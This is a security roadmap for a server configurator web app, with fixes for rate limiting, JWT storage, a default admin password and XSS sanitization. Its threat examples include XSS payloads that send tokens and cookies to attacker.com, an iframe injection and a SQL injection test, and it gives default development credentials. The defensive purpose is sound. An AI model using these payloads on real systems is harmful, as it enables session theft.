# Security Roadmap - LM TEK Server Configurator

**Created:** 2025-10-29
**Project Version:** 1.1.0
**Status:** Documentation - Not Yet Implemented

---

## Overview

This document outlines security vulnerabilities in the LM TEK Server Configurator application and provides a comprehensive implementation guide for fixing them. These issues are acceptable for development but **CRITICAL to fix before production deployment**.

---

## Security Issues Summary

| Issue | Risk Level | Time to Fix | Complexity | Priority |
|-------|-----------|-------------|------------|----------|
| 1. No Rate Limiting | 🔴 CRITICAL | 30 min | Low | P0 |
| 2. JWT in localStorage | 🔴 CRITICAL | 90 min | Medium | P0 |
| 3. Default Admin Password | 🔴 CRITICAL | 15 min | Very Low | P0 |
| 4. No Input Sanitization | 🟡 HIGH | 45 min | Low | P1 |
| **TOTAL** | | **~3 hours** | | |

---

## Issue #1: No Rate Limiting on Authentication

### Current Vulnerability

**Problem:** Unlimited login attempts allowed from any IP address.

**Attack Scenarios:**
- **Brute Force Attack:** Attacker tries thousands of password combinations
- **Credential Stuffing:** Testing stolen passwords from other breaches
- **DoS Attack:** Overwhelming server with authentication requests

**Example Attack:**
```bash
# Attacker script tries 10,000 passwords
for password in password_list:
    POST /api/auth/login
    { "email": "admin@lmtek.com", "password": password }
```

### Solution: Express Rate Limiting

**Install Package:**
```bash
cd server
npm install express-rate-limit
```

**Implementation:**

**File:** `server/src/routes/auth.routes.ts`

```typescript
import rateLimit from 'express-rate-limit';

// Create rate limiter for login endpoint
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Limit each IP to 5 requests per windowMs
  message: 'Too many login attempts from this IP, please try again after 15 minutes',
  standardHeaders: true, // Return rate limit info in `RateLimit-*` headers
  legacyHeaders: false, // Disable `X-RateLimit-*` headers
});

// Create rate limiter for registration endpoint (more lenient)
const registerLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3, // Limit each IP to 3 registrations per hour
  message: 'Too many accounts created from this IP, please try again after an hour',
});

// Apply to routes
router.post('/login', loginLimiter, authController.login);
router.post('/register', registerLimiter, authController.register);
```

### Testing

```bash
# Test rate limiting
# Try 6 login attempts in quick succession

curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@lmtek.com","password":"wrong"}'

# After 5 attempts, you should get:
# Status: 429 Too Many Requests
# Message: "Too many login attempts from this IP..."
```

### Considerations

- **IP-based limiting:** Works for most cases, but consider proxy/VPN users
- **Per-user limiting:** Could add username-based rate limiting for extra protection
- **Whitelist:** May want to whitelist certain IPs (office, admin IPs)

**Estimated Time:** 30 minutes
**Risk Level:** Very Low (only adds protection)

---

## Issue #2: JWT Stored in localStorage (XSS Vulnerable)

### Current Vulnerability

**Problem:** JWT authentication token stored in localStorage is accessible to JavaScript.

**Current Implementation:**
```typescript
// src/services/auth.service.ts
localStorage.setItem('token', response.data.token);

// src/lib/api.ts
const token = localStorage.getItem('token');
```

**Attack Scenario - XSS (Cross-Site Scripting):**
```html
<!-- If attacker injects this script -->
<script>
  // Steal token
  const token = localStorage.getItem('token');

  // Send to attacker's server
  fetch('https://attacker.com/steal?token=' + token);

  // Attacker can now impersonate the user
</script>
```

**Real-World Impact:**
- Attacker gains full access to user account
- Can view all quotes, modify data, delete components
- If admin token stolen, complete system compromise

### Solution: httpOnly Cookies

**Why httpOnly cookies are secure:**
- JavaScript **cannot** read httpOnly cookies (immune to XSS)
- Browser automatically sends cookie with each request
- Can set additional flags: `secure`, `sameSite` for extra protection

### Implementation Steps

#### Step 1: Backend - Set JWT as httpOnly Cookie

**File:** `server/src/routes/auth.routes.ts` (or `server/src/controllers/auth.controller.ts`)

```typescript
// OLD CODE (remove this):
res.json({
  token: jwt,
  user: { id, email, name, role }
});

// NEW CODE:
res.cookie('token', jwt, {
  httpOnly: true,              // Cannot be accessed by JavaScript
  secure: process.env.NODE_ENV === 'production', // HTTPS only in production
  sameSite: 'strict',          // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days (matches JWT expiry)
  path: '/'
}).json({
  user: { id, email, name, role }
});
```

**Update both:**
- Login endpoint (`POST /api/auth/login`)
- Register endpoint (`POST /api/auth/register`)

#### Step 2: Backend - Read JWT from Cookie

**File:** `server/src/middleware/auth.middleware.ts`

```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

export const authMiddleware = async (req: Request, res: Response, next: NextFunction) => {
  try {
    // OLD CODE (remove this):
    // const token = req.headers.authorization?.split(' ')[1];

    // NEW CODE:
    const token = req.cookies.token;

    if (!token) {
      return res.status(401).json({ message: 'Authentication required' });
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
};
```

#### Step 3: Backend - Install cookie-parser

**File:** `server/package.json`

```bash
cd server
npm install cookie-parser
npm install --save-dev @types/cookie-parser
```

**File:** `server/src/index.ts`

```typescript
import cookieParser from 'cookie-parser';

// Add after other middleware (before routes)
app.use(cookieParser());

// Update CORS to allow credentials
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'],
  credentials: true, // IMPORTANT: Allow cookies to be sent
}));
```

#### Step 4: Backend - Add Logout Endpoint

**File:** `server/src/routes/auth.routes.ts`

```typescript
// Add logout route
router.post('/logout', (req: Request, res: Response) => {
  res.clearCookie('token', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/'
  }).json({ message: 'Logged out successfully' });
});
```

#### Step 5: Frontend - Remove localStorage Usage

**File:** `src/services/auth.service.ts`

```typescript
// REMOVE all localStorage calls:
// localStorage.setItem('token', ...);  // DELETE
// localStorage.getItem('token');       // DELETE
// localStorage.removeItem('token');    // DELETE

export const authService = {
  async login(email: string, password: string) {
    const response = await api.post('/auth/login', { email, password });
    // Token is now in cookie, no need to store it
    return response.data; // Just return user data
  },

  async logout() {
    await api.post('/auth/logout');
    // Cookie will be cleared by server
  },

  async register(data: RegisterData) {
    const response = await api.post('/auth/register', data);
    // Token is now in cookie
    return response.data;
  },
};
```

#### Step 6: Frontend - Configure Axios for Cookies

**File:** `src/lib/api.ts`

```typescript
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL || 'http://localhost:3001/api',
  withCredentials: true, // IMPORTANT: Send cookies with requests
  headers: {
    'Content-Type': 'application/json',
  },
});

// REMOVE token interceptor (no longer needed):
// api.interceptors.request.use((config) => {
//   const token = localStorage.getItem('token');  // DELETE THIS
//   if (token) {
//     config.headers.Authorization = `Bearer ${token}`;
//   }
//   return config;
// });

export default api;
```

#### Step 7: Frontend - Update AuthContext

**File:** `src/contexts/AuthContext.tsx`

```typescript
// Remove any localStorage checks on mount
useEffect(() => {
  // OLD CODE (remove):
  // const token = localStorage.getItem('token');
  // if (token) { ... }

  // NEW CODE:
  // Check if user is authenticated by calling /me endpoint
  const checkAuth = async () => {
    try {
      const response = await api.get('/auth/me');
      setUser(response.data.user);
    } catch (error) {
      setUser(null);
    } finally {
      setLoading(false);
    }
  };

  checkAuth();
}, []);
```

**Note:** You may need to create a `GET /api/auth/me` endpoint on the backend that returns the current user based on the cookie.

### Testing

```bash
# 1. Login
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@lmtek.com","password":"admin123"}' \
  -c cookies.txt  # Save cookies

# Check cookies.txt - should see httpOnly cookie

# 2. Access protected route using cookie
curl -X GET http://localhost:3001/api/quotes \
  -b cookies.txt  # Load cookies

# 3. In browser DevTools
# Console: localStorage.getItem('token')  // Should be null
# Application tab: Cookies // Should see "token" with HttpOnly flag
```

**Estimated Time:** 90 minutes
**Risk Level:** Medium (requires thorough testing, but significantly improves security)

---

## Issue #3: Default Admin Password

### Current Vulnerability

**Problem:** Default admin credentials are publicly visible in code and documentation.

**Current Credentials:**
```bash
Email: admin@lmtek.com
Password: admin123
```

**Files Exposing Password:**
- `docker-compose.yml:40` - `ADMIN_PASSWORD: admin123`
- `server/.env` - Contains admin password
- `SESSION_2025-10-29.md` - Documented
- Various documentation files

**Risk:**
- Anyone with code access can login as admin
- Documentation shared publicly exposes credentials
- No audit trail of who performed admin actions

### Solution: Strong, Unique Password

#### Step 1: Generate Strong Password

**Use a password generator:**
```bash
# Linux/Mac
openssl rand -base64 32

# Or use online generator:
# - LastPass Password Generator
# - 1Password Strong Password Generator
# Minimum: 20 characters, mix of upper/lower/numbers/symbols
```

**Example Strong Password:**
```
X9k#mP2$vL8@nQ5!rT6&wY3^zA1-bC4
```

#### Step 2: Update Environment Variables

**Option A: Docker Compose (Development)**

**File:** `docker-compose.yml`

```yaml
backend:
  environment:
    # ... other vars
    ADMIN_PASSWORD: ${ADMIN_PASSWORD}  # Use env var instead of hardcoded
```

**Create `.env` file in project root:**
```bash
# .env
ADMIN_PASSWORD=X9k#mP2$vL8@nQ5!rT6&wY3^zA1-bC4
```

**Add to `.gitignore`:**
```bash
.env
```

**Option B: Server .env (Direct)**

**File:** `server/.env`

```bash
DATABASE_URL=postgresql://postgres:postgres123@localhost:5432/lmtek_configurator?schema=public
JWT_SECRET=your-super-secret-jwt-key-min-32-characters-long-for-production
JWT_EXPIRES_IN=7d
PORT=3001
ALLOWED_ORIGINS=http://localhost:3000,http://localhost
ADMIN_EMAIL=admin@lmtek.com
ADMIN_PASSWORD=X9k#mP2$vL8@nQ5!rT6&wY3^zA1-bC4  # NEW STRONG PASSWORD
ADMIN_NAME=System Administrator
```

#### Step 3: Update Documentation

**Remove password from all documentation:**
- `SESSION_*.md` files - Replace with `ADMIN_PASSWORD=<see .env file>`
- `PROJECT_CONTEXT.md` - Remove password references
- `README.md` - Add note about setting up `.env` file

**Create `SETUP.md` with instructions:**
```markdown
## Initial Setup

1. Copy `.env.example` to `.env`:
   ```bash
   cp .env.example .env
   ```

2. Generate admin password:
   ```bash
   openssl rand -base64 32
   ```

3. Update `.env` with your password:
   ```bash
   ADMIN_PASSWORD=your-generated-password-here
   ```

4. Start services:
   ```bash
   docker-compose up -d
   ```

**IMPORTANT:** Never commit `.env` to version control!
```

#### Step 4: Rotate Password Periodically

**Best Practices:**
- Change admin password every 90 days
- Use unique password (not shared with other services)
- Store in password manager (LastPass, 1Password, Bitwarden)
- Consider implementing password complexity requirements in code

### Testing

```bash
# 1. Restart services with new password
docker-compose down
docker-compose up -d

# 2. Try old password (should fail)
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@lmtek.com","password":"admin123"}'
# Expected: 401 Unauthorized

# 3. Try new password (should succeed)
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@lmtek.com","password":"<YOUR_NEW_PASSWORD>"}'
# Expected: 200 OK with user data
```

**Estimated Time:** 15 minutes
**Risk Level:** None (just save the new password securely)

---

## Issue #4: No Input Sanitization (XSS Risk)

### Current Vulnerability

**Problem:** User inputs are not sanitized, allowing script injection.

**Attack Scenarios:**

**Example 1: Quote Notes**
```typescript
// User submits quote with malicious notes
POST /api/quotes
{
  "notes": "<script>alert('XSS!');</script>",
  // ... other data
}

// When admin views quote, script executes in their browser
```

**Example 2: User Registration**
```typescript
// User registers with malicious name
POST /api/auth/register
{
  "name": "<img src=x onerror='fetch(\"https://attacker.com/steal?data=\" + document.cookie)'>",
  "email": "attacker@example.com",
  "password": "password123"
}

// Name displays as image, executes script on error
```

**Example 3: Component Management**
```typescript
// Admin adds component with malicious spec
POST /api/components
{
  "name": "Legit Component",
  "spec": "<iframe src='https://malicious.site'></iframe>",
  "listPrice": 999
}

// Spec renders as iframe when displayed
```

### Solution: Input Sanitization & Validation

#### Step 1: Install Validation Library

```bash
cd server
npm install validator
npm install --save-dev @types/validator

# Alternative: Use DOMPurify for more comprehensive HTML sanitization
# npm install isomorphic-dompurify
```

#### Step 2: Create Sanitization Utility

**File:** `server/src/utils/sanitize.ts`

```typescript
import validator from 'validator';

export const sanitize = {
  /**
   * Escape HTML special characters to prevent XSS
   */
  text(input: string): string {
    if (!input) return '';
    return validator.escape(input.trim());
  },

  /**
   * Validate and sanitize email
   */
  email(input: string): string {
    if (!input) return '';
    const normalized = validator.normalizeEmail(input.trim().toLowerCase());
    if (!normalized || !validator.isEmail(normalized)) {
      throw new Error('Invalid email format');
    }
    return normalized;
  },

  /**
   * Sanitize and limit text length
   */
  limitedText(input: string, maxLength: number = 1000): string {
    if (!input) return '';
    const sanitized = validator.escape(input.trim());
    return sanitized.substring(0, maxLength);
  },

  /**
   * Validate numeric input
   */
  number(input: any, min?: number, max?: number): number {
    const num = parseFloat(input);
    if (isNaN(num)) {
      throw new Error('Invalid number');
    }
    if (min !== undefined && num < min) {
      throw new Error(`Number must be at least ${min}`);
    }
    if (max !== undefined && num > max) {
      throw new Error(`Number must be at most ${max}`);
    }
    return num;
  },

  /**
   * Validate UUID
   */
  uuid(input: string): string {
    if (!validator.isUUID(input)) {
      throw new Error('Invalid UUID format');
    }
    return input;
  },
};
```

#### Step 3: Apply Sanitization to Routes

**File:** `server/src/routes/auth.routes.ts`

```typescript
import { sanitize } from '../utils/sanitize';

router.post('/register', async (req: Request, res: Response) => {
  try {
    // Sanitize inputs
    const email = sanitize.email(req.body.email);
    const name = sanitize.limitedText(req.body.name, 100);
    const password = req.body.password; // Don't sanitize password (will be hashed)
    const phone = req.body.phone ? sanitize.limitedText(req.body.phone, 20) : undefined;
    const company = req.body.company ? sanitize.limitedText(req.body.company, 200) : undefined;

    // Validate password strength
    if (!password || password.length < 8) {
      return res.status(400).json({ message: 'Password must be at least 8 characters' });
    }

    // Continue with registration logic...
  } catch (error) {
    if (error.message.includes('Invalid')) {
      return res.status(400).json({ message: error.message });
    }
    return res.status(500).json({ message: 'Server error' });
  }
});
```

**File:** `server/src/routes/quote.routes.ts`

```typescript
import { sanitize } from '../utils/sanitize';

router.post('/', authMiddleware, async (req: Request, res: Response) => {
  try {
    // Sanitize quote inputs
    const notes = req.body.notes ? sanitize.limitedText(req.body.notes, 2000) : undefined;
    const totalPrice = sanitize.number(req.body.totalPrice, 0, 1000000);

    // Validate configuration object (nested sanitization)
    const configuration = sanitizeConfiguration(req.body.configuration);

    // Continue with quote creation...
  } catch (error) {
    // Handle errors
  }
});

// Helper function for nested objects
function sanitizeConfiguration(config: any): any {
  return {
    gpu: {
      model: sanitize.text(config.gpu.model),
      quantity: sanitize.number(config.gpu.quantity, 1, 8),
      price: sanitize.number(config.gpu.price, 0),
      // ... sanitize other fields
    },
    // ... sanitize other categories
  };
}
```

**File:** `server/src/routes/component.routes.ts`

```typescript
import { sanitize } from '../utils/sanitize';

router.post('/', authMiddleware, adminMiddleware, async (req: Request, res: Response) => {
  try {
    // Sanitize component inputs
    const name = sanitize.limitedText(req.body.name, 200);
    const spec = sanitize.limitedText(req.body.spec, 1000);
    const listPrice = sanitize.number(req.body.listPrice, 0);
    const category = req.body.category; // Validated by enum

    // Sanitize metadata (if present)
    const metadata = req.body.metadata ? sanitizeMetadata(req.body.metadata) : undefined;

    // Continue with component creation...
  } catch (error) {
    // Handle errors
  }
});

function sanitizeMetadata(meta: any): any {
  const sanitized: any = {};
  if (meta.capacity) sanitized.capacity = sanitize.number(meta.capacity, 0);
  if (meta.cores) sanitized.cores = sanitize.number(meta.cores, 0);
  if (meta.psuCount) sanitized.psuCount = sanitize.number(meta.psuCount, 1, 5);
  if (meta.gpuSupport) sanitized.gpuSupport = sanitize.number(meta.gpuSupport, 1, 8);
  return sanitized;
}
```

#### Step 4: Frontend Sanitization (Defense in Depth)

**Install DOMPurify for frontend:**

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

**File:** `src/utils/sanitize.ts`

```typescript
import DOMPurify from 'dompurify';

export const sanitizeHTML = (html: string): string => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [], // No HTML tags allowed, plain text only
    ALLOWED_ATTR: [],
  });
};

export const sanitizeForDisplay = (text: string): string => {
  // Basic sanitization for display
  return text
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
};
```

**Use in components:**

```typescript
// When displaying user-generated content
<div className="quote-notes">
  {sanitizeForDisplay(quote.notes)}
</div>
```

### Testing

```bash
# Test 1: Try to inject script via quote notes
curl -X POST http://localhost:3001/api/quotes \
  -H "Content-Type: application/json" \
  -H "Cookie: token=<YOUR_TOKEN>" \
  -d '{
    "notes": "<script>alert(\"XSS\")</script>",
    "totalPrice": 10000,
    "configuration": {...}
  }'

# Expected: Notes should be escaped
# Stored as: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

# Test 2: Try SQL injection (should fail)
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@lmtek.com\" OR 1=1--",
    "password": "anything"
  }'

# Expected: 401 Unauthorized (Prisma ORM prevents SQL injection)

# Test 3: Try to inject HTML in component name
# Login as admin, add component with malicious name
# Expected: HTML should be escaped, not rendered
```

### Additional Considerations

**Content Security Policy (CSP):**

Add CSP headers to prevent inline scripts:

**File:** `server/src/index.ts`

```typescript
import helmet from 'helmet';

// Add helmet for security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Allow inline styles for Tailwind
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));
```

**Install helmet:**
```bash
cd server
npm install helmet
```

**Estimated Time:** 45 minutes
**Risk Level:** Low (might need UI adjustments for escaped characters)

---

## Implementation Order (Recommended)

### Phase 1: Quick Wins (1 hour)
1. ✅ Change admin password (15 min)
2. ✅ Add rate limiting to auth endpoints (30 min)
3. ✅ Basic input sanitization on critical fields (15 min)

**Result:** Immediate security improvements with minimal risk

### Phase 2: Core Security (2 hours)
1. ✅ Implement httpOnly cookies for JWT (90 min)
2. ✅ Comprehensive input sanitization (30 min)

**Result:** Production-ready security posture

### Phase 3: Advanced (Optional)
1. Add Content Security Policy headers
2. Implement HTTPS/SSL
3. Add security monitoring/logging
4. Set up security headers (helmet.js)
5. Implement CSRF tokens
6. Add database query logging
7. Set up automated security scanning

---

## Verification Checklist

Before deploying to production, verify:

### Authentication Security
- [ ] Login rate limiting active (max 5 attempts per 15 min)
- [ ] Registration rate limiting active (max 3 per hour)
- [ ] JWT stored in httpOnly cookie (not localStorage)
- [ ] Admin password changed to strong unique value
- [ ] Admin password stored in env var (not in code)
- [ ] Password not in any documentation or README

### Input Validation
- [ ] All text inputs sanitized (name, notes, spec)
- [ ] Email validation working
- [ ] Numeric inputs validated (min/max ranges)
- [ ] UUID validation for IDs
- [ ] Configuration object fully sanitized

### Testing
- [ ] Try XSS attacks in quote notes (should be escaped)
- [ ] Try 6+ login attempts (should get rate limited)
- [ ] Inspect cookies in browser (httpOnly flag set)
- [ ] Try SQL injection (Prisma should prevent)
- [ ] Check localStorage (should NOT contain token)

### Configuration
- [ ] CORS configured with credentials: true
- [ ] Cookie settings: httpOnly, secure, sameSite
- [ ] Environment variables for secrets
- [ ] .env file in .gitignore
- [ ] HTTPS enabled (production)

---

## Production Deployment Checklist

Additional security steps for production:

### HTTPS/SSL
- [ ] SSL certificate installed
- [ ] HTTP redirects to HTTPS
- [ ] Cookie `secure` flag enabled
- [ ] Update CORS origins to production domain

### Environment Variables
```bash
# Production .env
NODE_ENV=production
DATABASE_URL=<production-db-url>
JWT_SECRET=<strong-random-64-char-string>
ADMIN_PASSWORD=<strong-unique-password>
ALLOWED_ORIGINS=https://yourdomain.com
```

### Security Headers
- [ ] Helmet.js configured
- [ ] CSP policy active
- [ ] HSTS enabled
- [ ] X-Frame-Options set

### Monitoring
- [ ] Error tracking (Sentry, etc.)
- [ ] Login attempt monitoring
- [ ] Failed authentication logging
- [ ] Rate limit violations logged

### Database
- [ ] Database user has minimal permissions
- [ ] Database password is strong and unique
- [ ] Database not exposed to public internet
- [ ] Regular backups configured

---

## Resources

### Documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [JWT Security Best Practices](https://curity.io/resources/learn/jwt-best-practices/)

### Tools
- [validator.js](https://github.com/validatorjs/validator.js) - Input validation
- [DOMPurify](https://github.com/cure53/DOMPurify) - HTML sanitization
- [express-rate-limit](https://github.com/express-rate-limit/express-rate-limit) - Rate limiting
- [helmet](https://helmetjs.github.io/) - Security headers
- [OWASP ZAP](https://www.zaproxy.org/) - Security testing

### Password Generators
- [LastPass Password Generator](https://www.lastpass.com/features/password-generator)
- [1Password Strong Password Generator](https://1password.com/password-generator/)
- OpenSSL: `openssl rand -base64 32`

---

## Support & Questions

If you encounter issues during implementation:

1. **Check logs:**
   ```bash
   docker-compose logs -f backend
   ```

2. **Test in isolation:**
   - Test each security fix independently
   - Verify existing functionality still works

3. **Rollback plan:**
   - Keep git commits small and focused
   - Test thoroughly before deploying
   - Have database backup before major changes

---

**Last Updated:** 2025-10-29
**Next Review:** Before production deployment
**Owner:** Development Team
